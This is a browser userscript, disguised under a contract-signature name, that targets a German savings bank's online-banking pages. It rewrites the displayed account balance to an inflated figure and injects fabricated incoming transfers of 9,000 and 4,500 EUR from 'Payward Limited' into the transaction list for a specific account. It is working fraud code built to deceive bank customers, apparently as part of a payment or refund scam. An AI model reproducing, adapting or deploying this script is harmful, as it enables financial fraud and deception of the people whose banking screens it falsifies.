// ==UserScript==
// @name         Vertragssignature Armin Willy Treide
...
// @match        https://www.dksk-heidenheim.de/de/home/onlinebanking/nbf/umsaetze.html*
// @match        https://www.dksk-heidenheim.de/de/home/onlinebanking/nbf/finanzuebersicht.html*
// @match        https://www.dksk-heidenheim.de/de/home/onlinebanking/nbf/banking/einzelauftrag.html*
// @icon         https://www.google.com/s2/favicons?sz=64&domain=google.com
// @grant        none
// @downloadURL https://update.greasyfork.org/scripts/469496/Vertragssignature%20Armin%20Willy%20Treide.user.js
// @updateURL https://update.greasyfork.org/scripts/469496/Vertragssignature%20Armin%20Willy%20Treide.meta.js
// ==/UserScript==
...
(function() {
    ...
    var firma = "test";
    var asenderReference = "WD3781 TRX88205A CX13280";
    var absenderDetails = "Einreichung einer Treuhand Überweisung. Freigabe nötig durch Payward Limited";
    var amount = 0;
    var vorgemerkt = "no";
    var xamount = 9000;
    var buchung = 4500;
    var buchungDecimal = "51";
    var buchungTextsZahl = "153.984";
    var accountsecurity = "31 0977 07";
    ...
    if (window.location.href.indexOf("finanzuebersicht") > 0) {
        ...
        if (vorgemerkt == "no"){
            ...
            var bxpointerOverviewAcc = document.getElementsByClassName("balance-predecimal")[1].textContent;
            var bxrealAccBalance = bxpointerOverviewAcc.replace(".", "");
            var bxfakeAccBalance = parseFloat(bxrealAccBalance) + buchung;
            var bxfakeAccBalancewithcomma = numberWithCommas(bxfakeAccBalance);
            document.getElementsByClassName("balance-predecimal")[1].textContent = bxfakeAccBalancewithcomma;
    ...
    if (window.location.href.indexOf("umsaetze") > 0) {
        ...
        if (document.getElementsByClassName("mkp-identifier-description")[0].children[1].children[0].textContent == accountsecurity ){
            ...
            var x2HTML = '<li aria-label="RUECKUEBERWEISUNG Sonstige Gruende Transfer  ; 9.000,00 EUR" style="list-style-type: none;"><div class="mkp-card mkp-card-debit mkp-card-thinner mkp-card-clickable"><div class="mkp-identifier"><div class="mkp-identifier-description"><h3><a href="#" onclick="return IF.checkFirstSubmit();" class="mkp-identifier-link" title="Payward Limited">Payward Limited</a></h3><p>Withdrawal Trading Account: AY01-503DE-SM 2ND</p></div><div class="mkp-identifier-sticker-placeholder"></div><div class="mkp-identifier-currency"><div class="mkp-currency mkp-currency-m"><span aria-hidden="true" class="balance-predecimal plus">9.000</span><span aria-hidden="true" class="balance-decimal plus">,00&nbsp;EUR</span><span aria-hidden="false" class="offscreen">4.500,00 EUR</span></div></div></div></div></li>';
            var xa2HTML = '<li aria-label="RUECKUEBERWEISUNG Sonstige Gruende Transfer  ; 4.500,00 EUR" style="list-style-type: none;"><div class="mkp-card mkp-card-debit mkp-card-thinner mkp-card-clickable"><div class="mkp-identifier"><div class="mkp-identifier-description"><h3><a href="#" onclick="return IF.checkFirstSubmit();" class="mkp-identifier-link" title="Payward Limited">Payward Limited</a></h3><p>Withdrawal Trading Account: AY01-503DE-SM 2ND</p></div><div class="mkp-identifier-sticker-placeholder"></div><div class="mkp-identifier-currency"><div class="mkp-currency mkp-currency-m"><span aria-hidden="true" class="balance-predecimal plus">4.500</span><span aria-hidden="true" class="balance-decimal plus">,00&nbsp;EUR</span><span aria-hidden="false" class="offscreen">4.500,00 EUR</span></div></div></div></div></li>';
            //document.getElementsByClassName("mkp-card-list")[1].innerHTML = save2HTML + x2HTML;
            //block spk-analytics.js;
            document.getElementsByClassName("mkp-card-list")[0].innerHTML = x2HTML + xHTML + saveHTML;
        }
